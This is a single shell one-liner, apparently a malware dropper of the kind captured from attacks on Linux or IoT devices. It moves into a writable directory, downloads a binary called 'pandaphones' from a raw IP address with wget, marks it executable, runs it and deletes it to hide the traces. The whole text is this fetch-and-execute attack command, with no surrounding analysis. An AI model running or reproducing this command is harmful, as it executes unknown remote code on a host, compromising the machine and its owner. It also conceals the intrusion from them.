cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.88.209.253/pandaphones; chmod +x pandaphones; ./pandaphones; rm -rf pandaphones
